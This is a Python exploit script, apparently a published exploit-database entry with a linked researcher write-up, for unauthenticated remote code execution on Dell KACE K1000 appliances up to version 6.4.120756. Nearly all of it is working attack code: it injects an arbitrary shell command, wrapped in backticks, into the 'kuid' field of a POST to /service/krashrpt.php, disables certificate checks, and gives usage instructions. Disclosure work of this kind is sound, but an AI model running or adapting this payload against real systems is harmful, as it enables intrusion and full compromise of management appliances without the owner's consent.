# Exploit Title: Dell KACE Systems Management Appliance (K1000) <= 6.4.120756 Unauthenticated RCE
# Version:       <= 6.4.120756
# Author:        Julien Ahrens (@MrTuxracer)
# Software Link: https://www.quest.com/products/kace-systems-management-appliance/
# Write-up:      https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/
# Note:          The software is maintained by Quest now, but the vulnerability was fixed while Quest was part of Dell.            
#
# Usage: python3 exploit.py https://localhost &#039;sleep 10&#039;

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = sys.argv[1]
payload = sys.argv[2]

r = requests.post(target_url + &#039;/service/krashrpt.php&#039;, data={
    &#039;kuid&#039; : &#039;`&#039; + payload + &#039;`&#039;
    }, verify=False)

print(&#039;Response: %s %s\nKACE Version: %s\nResponse time: %ss&#039; % (r.status_code, r.reason, r.headers[&#039;X-DellKACE-Version&#039;], r.elapsed.total_seconds()))

